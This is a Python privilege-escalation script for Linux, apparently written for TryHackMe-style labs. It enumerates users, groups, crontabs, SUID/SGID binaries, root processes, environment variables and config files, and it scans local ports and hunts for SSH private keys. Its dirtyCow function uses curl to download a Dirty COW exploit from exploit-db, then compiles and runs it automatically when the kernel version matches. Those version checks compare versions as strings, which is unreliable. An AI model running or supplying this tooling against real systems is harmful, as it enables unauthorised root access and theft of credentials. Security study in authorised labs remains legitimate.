#/usr/bin/python
#/usr/bin/python3

# Author: hackername
# search me on: try hack me at hackername

# Scope: Privilege escalation

# How it works:
# ////////////////////////////////////////////////////////////////////////////////////////////////////////


# This is a script that search some vulnerabilities or information on the system.
# IT WORKS ONLY ON BASH SYSTEMS so you can run it in Linux and Mac OS.
# If you want to change this script or customize it for you you can do it! It is open source!!!

# usage:
# $python rocket.py 
# $python2 rocket.py 
# $python3 rocket.py 
# $python3.9 rocket.py 

# exaple:
# python3 rocket.py 

# ////////////////////////////////////////////////////////////////////////////////////////////////////////


# importing some libraries...

import re
from time import sleep
import os
import platform
import subprocess
import sys
import socket
from os import system


# define some classes...
class color:
	red = '\033[31m'
	green = '\033[32m'
	yellow = '\033[33m'
	blue = '\033[34m'
	underline = '\033[4m'
	reset = '\033[0m'


# functions...

# open a file
def open_file(files):
	try:
		with open(files, 'r') as f:  # open file in input
			content = f.read()
			# print(content)
			return content

	except (IOError, OSError) as e:
			print(f'{color.red}ERROR: {e}{color.reset}')
			print(f'{color.red}\n[-]{files} scan not completed!{color.reset}')

	except:
		print(f'{color.red}[-]ERROR: unknown error{color.reset}')
		print(f'{color.red}\n[-]{files} scan not completed!{color.reset}')



# take a look inside a dir...
def dir(path):

	try:
		# inputs
		directory = os.listdir(path)
		return directory

	except (OSError, IOError) as e:
		print(f'{color.red}ERROR: {e}{color.reset}')
		print(f'{color.red}[-]{path} directory scan not completed{color.reset}')

	except:
		print(f'{color.red}[-]ERROR: unknown error{color.reset}')
		print(f'{color.red}[-]{path} directory scan not completed{color.reset}')


 

def ports(ip,r):

	try:

		for port in range(1,r):
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 		# configuring socket 
			result = sock.connect_ex((ip, port))		# connecting ip
			sock.settimeout(5) # Socket Timeout
			
			if result == 0:			# if port is open
				print(color.green + "port {}: open".format(port) + color.reset)

			sock.close() 		# close connection


	except socket.error as e:
		print(f'{color.red}\n[-]an error occurred: {e}{color.reset}')

	except socket.gaierror as e:
		print(f'{color.red}\n[-]an error occurred: {e}{color.reset}')


# Search Files 
def find_files(filename=None, path=None):

	results = []

	try:

		for root, folder, files in os.walk(path):

			if filename != None:
				if filename in files:
					results.append(os.path.join(root, filename))

			else:
				for file in files:
					results.append(f"{root}/{file}")

		return results # returns a list 
	except KeyboardInterrupt:
		return False


def check_if_exists(lst, value):
	for item in lst:
		item = str(item)
		if value in item:
			return True
	return False


def dirtyCow():
	print(f'{color.yellow}{color.underline}\n\nTesting Dirty Cow exploit{color.reset}')

	try: 
		searching_gcc = filter((lambda x: '/lib' not in str(x)), find_files("gcc", "/"))
		is_installed = check_if_exists(searching_gcc, "gcc")

		if is_installed:

			print(f'{color.blue}\ndownloading exploit{color.reset}')
			os.system(
				f'curl https://www.exploit-db.com/download/40839 -o dirty.c;gcc -pthread dirty.c -o dirty -lcrypt; chmod +x dirty; ./dirty')		# downloading and executing exploit
		else:
			print(f"{color.red}[!] Skipping dirtyCow exploit downloading and executing")
			print(f"[!] GCC Not installed{color.reset}")

	except (IOError, OSError) as e:
		print(f'{color.red}\n[-]there was an error: {e}{color.reset}')
	except TypeError:
		print(f"{color.red}[!] Skipping dirtyCow exploit downloading and executing")
		print(f"[!] KeyboardInterrupt{color.reset}")
		return False


def banner():
	print('this is a banner')

# Color Legend
def color_legend():
	return f''''{color.yellow}{color.underline}\n\n\nColors legend:{color.reset}
		{color.yellow}- Yellow for titles
		{color.blue}- Blue for neutral info
		{color.green}- Green for vulnerabilities and critical info
		{color.red}- Red for bankruptcy information{color.reset}'''


def get_system_details():

	# kernel version
	print(f'{color.yellow}\nkernel version:{color.reset}')
	kernel = platform.release()
	print(platform.system())  # linux, windows ecc...
	print(kernel)  # kernel
	if kernel >= '5.8.0':
		print(f'{color.red}[-]the kernel has a good version{color.reset}')

	else:
		print(f'{color.green}[+]the kernel has a old version, search for vulnerabilities{color.reset}')


def check_dirtyCow_exploit():


	kernel = platform.release() # Get Kernel Info

	# trying dirty cow exploit
	dirtyCowMin = '2.6.22'
	dirtyCowMax = '3.9'
	if kernel >= dirtyCowMin and kernel <= dirtyCowMax:
		try:
			dirtyCow()

		except KeyboardInterrupt:
			print(f'{color.red}Stoppped with ctrl+c{color.reset}')


def get_release_files():
	os.system('cat /etc/*release')


def get_user_info():
	# user info
	print(f'{color.yellow}{color.underline}\n\nusers info:{color.reset}')

	# user id, group ecc...
	print(f'{color.yellow}\nid{color.reset}')
	try:
		os.system('id')  # id info

	except OSError as error:
		print(f'{color.red}[-]{e}{color.reset}')

	except:
		print(f'{color.red}[-]ERROR: unknown error{color.red}')

# Get System Users Function
def get_system_users():

	print(f'{color.yellow}\n[*] Users in the system:{color.reset}')
	users = open_file('/etc/passwd')

#	for user in users.split():
#		print(user.split(':')[0])
	print(f"{color.yellow}{color.underline}\n\n[*] Other users on the system{color.reset}")
	print(users)

	# users with shell in the system
	print(f'{color.yellow}\n[*] Users with shell in the system:{color.reset}')
	
	for user in users.split():
		if bool(re.search("sh$", user)):
			print(user)


# Check if The user is privileged
def get_privileged_users(group_file):
	
	for user in group_file:
		if ':0:' in user:
			print(user)


# Get Crontab Files
def get_crontabs():
	
	try:
		# /etc/crontab
		print(f'{color.yellow}\n/etc/crontab file:{color.reset}')
		print(open_file('/etc/crontab'))

		crontabs_directories = (
			'/etc/cron.d', '/etc/cron.daily',
			'/etc/cron.hourly', '/etc/cron.weekly',
			'/etc/cron.monthly' 
			)

		# Getting other crontab files

		for cron in crontabs_directories:
			folder = dir(cron)

			for file in folder:
				print(f"\n{folder}/{file}")
				print(open_file(f"{cron}/{file}"))
	
	except (FileNotFoundError, TypeError):
		pass


def check_processes():

	# programs
	print(f'{color.yellow}{color.underline}\n\n[*] Programs:{color.reset}')

	# python version
	print(f'{color.yellow}\n[*] Python version:{color.reset}')
	v = sys.version
	print(f'{color.blue}[*] your Python version is:{color.reset}{v}')

	# apache version
	print(f'{color.yellow}\napache version{color.reset}')
	os.system("httpd -v")

	#running programs
	print(f'{color.yellow}\nrunning programs:{color.reset}')

	v = sys.version

	if v <= "2.7.18":

		proc1 = subprocess.Popen(['ps', 'aux'], stdout=subprocess.PIPE)
		proc2 = subprocess.Popen(['grep', 'root'], stdin=proc1.stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

		proc1.stdout.close()  # Allow proc1 to receive a SIGPIPE if proc2 exits.
		out, err = proc2.communicate()

		print('out: {0}'.format(out))
		print('err: {0}'.format(err))
		print(f'{color.blue}[*] program running as root completed!{color.reset}')

	else:
		os.system('ps aux | grep root')

		print(f'{color.blue}[*] program running as root completed!{color.reset}')

def suid_and_sgid():

	known_suid = (
		'/usr/bin/su', '/usr/bin/chfn', '/usr/bin/gpasswd', '/usr/bin/sudo', '/usr/bin/nwegrp'
		'/usr/bin/fusermount', '/usr/bin/at', '/usr/bin/passwd', '/usr/bin/pkexec', '/usr/bin/chsh'
		'/usr/bin/umount', '/usr/bin/mount', '/usr/bin/ping')
	 
	#sleep(2)
	try:

		try:
			# suid files + sgid
			print(f'{color.yellow}\n[*] SUID:{color.reset}')
			system('find / -perm -4000 -type f -exec ls -ld {} \; 2>/dev/null')  # search with find


			print(f"{color.yellow}{color.underline}\n\n[*] SGID{color.reset}")
			system('find / -perm -2000 -type f -exec ls -ld {} \; 2>/dev/null')

			try:
				system('sudo -l')  # sudoers

			except KeyboardInterrupt:
				print(f'{color.red}[-]Stopped whit ctrl+c{color.reset}')	

		except KeyboardInterrupt:  # if CTRL+C exit
			print(f'{color.red}[-]You pressed ctrl + c{color.reset}')

		except OSError as e:
			print(f'{color.red}[-]{e}{color.reset}')

		except:
			print(f'{color.red}[-]ERROR: unknown error{color.reset}')

	except:
		print(f'{color.red}[-]SUID + SGID files scan not completed{color.reset}')



def list_system_folders():

	try:

		folders = (
			'/etc', '/home', '/tmp',
			'/opt', '/var', '/var/www',
			'/var/log', '/var/log/apache2',
			'/var/log/apache', '/var/log/nginx/', 
			'/var/lib/mysql', '/var/backups', '/var/backup', 
			'/opt/backups', '/opt/backup'
			'/media', '/mnt', '/root', '/usr', 
			'/usr/sbin', '/sbin', '/bin', '/dev'
			)

		for folder in folders:
			
			paths = find_files(filename=None, path=folder)
			print(f"{color.yellow}{color.underline}\n\n[!] {folder} {color.reset}")

			for path in paths:
				print(path)
	
	except TypeError:
		pass

def get_running_processes():
	# tasks/jobs
	print(f'{color.yellow}{color.underline}\n\ntasks + jobs in the system:{color.reset}')

	# running programs
	print(f'{color.yellow}\nrunning programs:{color.reset}')
	os.system("ps aux")


def networking():
	# networking
	print(f'{color.yellow}{color.underline}\n\nnetworking:{color.reset}')

	#interface configuration
	print(f'{color.yellow}\ninterface configuration:{color.reset}')
	is_installed = False

	for result in filter((lambda x: '/lib' not in str(x)), find_files("ifconfig", "/")):
		if '/bin/ifconfig' in result:
			is_installed = True

	if is_installed:
		os.system("ifconfig")
	else:
		os.system('ip a')


def arp_history():
	return open_file('/proc/net/arp')


def conf_files():

	# open *.conf files
	print(f'{color.yellow}\nconfiguration files:{color.reset}')
	os.system("find /etc | grep .conf")


def ssh_keys():
	try:
		
		print(f"{color.yellow}\n\n[*] Searching for SSH private key files{color.reset}")

		keys = find_files("id_rsa", "/") # Search for Key file

		if len(keys) == 0: # Interrupt if No key file was found
			print(f"{color.red}[!] No SSH Key files found{color.reset}") 
			return

		for key in keys:
			print(f"{color.green} [!] SSH Key file found at {color.reset}'{key}'")

	except:
		pass


def main():
	
	# clear screen
	os.system('clear')
	
	# import Terminal
	os.environ['TERM'] = 'xterm'

	# run program
	print(f'{color.green}{color.underline}[!] Script started\n\n\n{color.reset}')
	banner()

	# Print Color Legend
	print(color_legend())

	# info about os
	print(f'{color.yellow}{color.underline}\n\n[*] OS info:{color.reset}')
	get_system_details()

	# DirtyCow
	check_dirtyCow_exploit()

	# Get Release Files
	get_release_files()

	# enviroment
	print(f'{color.yellow}\n[*] Enviroment settings:{color.reset}')
	os.system("printenv")

	# Get User Info
	get_user_info()

	# users in the system
	get_system_users()

	# System Groups
	print(f"{color.yellow}{color.underline}\n\n[*]System Groups{color.reset}")
	group_file = open_file('/etc/group')
	print(group_file)

	# privileged users in the system
	print(f'{color.yellow}\n[*] Privileged users in the system:{color.reset}')
	get_privileged_users(group_file.split())

	# Get Crontabs
	get_crontabs()

	# Check Processes
	check_processes()

	# SUID / SGID
	suid_and_sgid()

	# files + dir
	print(f'{color.yellow}{color.underline}\n\n[*] Files and Dirs in the system:{color.reset}')
	list_system_folders()

	# Running processes
	get_running_processes()

	# Networking
	networking()

	# Arp History
	print(f'{color.yellow}\n[*] Arp history file:{color.reset}')
	print(arp_history())

	# Conf Files
	conf_files()

	# fast port scanning
	print(f'{color.yellow}\n[*] Open port(s) in the system:{color.reset}')
	ports('127.0.0.1',65535)

	# SSH Private Keys
	ssh_keys()

	# end
	print(f'{color.green}{color.underline}\n\nScript ended\n\n\n{color.reset}')


if __name__ == "__main__" :
	main()


# # /etc/lsb-release file
# print(f'{color.yellow}\n[*] /etc/lsb-release file:{color.reset}') # lsb-release file exists only on Debian based systems
# file('/etc/lsb-release')

# sudo version 
# print(f'{color.yellow}\n[*] sudo version:{color.reset}') # On some properly configured system may ask for the sudo password
# os.system('sudo -V')

# # /etc/passwd
# print(f'{color.yellow}\n/etc/passwd file:{color.reset}')
# open_file('/etc/passwd')

